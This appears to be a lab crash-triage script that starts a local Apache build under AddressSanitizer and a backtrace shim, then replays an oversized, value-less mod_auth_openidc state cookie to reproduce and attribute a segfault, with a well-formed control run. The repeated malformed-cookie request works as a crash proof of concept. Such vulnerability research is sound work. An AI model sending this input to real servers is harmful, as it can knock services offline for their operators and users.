#!/usr/bin/env bash
# Attribute the intermittent plain-module SIGSEGV without disabling ASLR.
# A lab-only SIGSEGV backtrace shim replaces Apache's fatal handler.
# Loopback 127.0.0.1:18090 only.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
CONF="$HERE/httpd-plain.conf"
ERR="$HERE/error-plain.log"
URL=http://127.0.0.1:18090/protected
OUT="$HERE/evidence/plain-crash"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
mkdir -p "$OUT"
gcc -shared -fPIC -O2 -o "$OUT/catchsegv.so" "$HERE/catchsegv.c" -ldl
stop() { "$HTTPD" -f "$CONF" -k stop >/dev/null 2>&1 || true; sleep 1; }
trap stop EXIT
stop
LD_PRELOAD="/usr/lib/x86_64-linux-gnu/libasan.so.8:$OUT/catchsegv.so" "$HTTPD" -f "$CONF" -k start >"$OUT/sigsegv-start.out" 2>&1
sleep 2
PAD=$(printf 'a%.0s' $(seq 1 7800))
: >"$OUT/sigsegv-codes.txt"
for i in $(seq 1 60); do
  code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
    -H "Cookie: mod_auth_openidc_state_$PAD" "$URL" 2>/dev/null || echo CURLERR)
  echo "$i $code" >>"$OUT/sigsegv-codes.txt"
  [ "$code" = "000" ] || [ "$code" = "CURLERR" ] && break
done
cp "$ERR" "$OUT/sigsegv-bare-error.log"
: >"$OUT/sigsegv-safe-codes.txt"
for i in $(seq 1 10); do
  code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
    -H "Cookie: mod_auth_openidc_state_$PAD=1" "$URL" 2>/dev/null || echo CURLERR)
  echo "$i $code" >>"$OUT/sigsegv-safe-codes.txt"
done
cp "$ERR" "$OUT/sigsegv-safe-error.log"
cp "$ERR" "$OUT/sigsegv-error.log"
printf 'shim_trials=%s empty=%s backtraces=%s\n' \
  "$(wc -l <"$OUT/sigsegv-codes.txt")" \
  "$(grep -c '000\|CURLERR' "$OUT/sigsegv-codes.txt" || true)" \
  "$(grep -c SEGVHANDLER "$OUT/sigsegv-error.log" || true)" >"$OUT/sigsegv-summary.txt"
cat "$OUT/sigsegv-summary.txt"
grep -A25 SEGVHANDLER "$OUT/sigsegv-error.log" | head -60
